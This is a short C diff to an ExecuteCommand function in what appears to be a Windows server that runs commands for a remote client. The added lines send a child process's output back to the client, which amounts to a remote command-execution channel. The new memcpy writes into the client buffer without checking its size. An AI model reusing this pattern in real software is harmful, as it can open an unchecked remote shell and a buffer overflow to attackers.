@@ -78,7 +78,11 @@ BOOL ExecuteCommand(PSERVERPARAM pServerParam)
         char tmp[1025] = { 0 };
         ReadFile(hStdOutPipeRead, tmp, 1024, &dwRead, NULL);
         tmp[dwRead] = '\0';
-
+        // Example push back to client
+        // TODO: This works, but needs cleaning and more fidelity 
+        SecureZeroMemory(pServerParam->ClientData->buf, pServerParam->ClientData->len);
+        memcpy(pServerParam->ClientData->buf, tmp, dwRead);
+        pServerParam->ClientData->len = dwRead; 
         // TODO: Clean up above and read all data 
 
         GetExitCodeProcess(procInf.hProcess, &dwError);
